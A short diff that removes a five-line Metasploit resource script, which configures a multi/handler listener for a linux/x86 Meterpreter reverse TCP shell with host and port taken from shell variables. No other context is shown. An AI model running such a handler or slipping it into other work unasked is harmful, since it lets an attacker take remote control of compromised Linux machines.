@@ -1,5 +1,0 @@
-use exploit/multi/handler
- set LPORT $b
- set LHOST $a                                                                                    
-set payload linux/x86/meterpreter/reverse_tcp   
-exploit
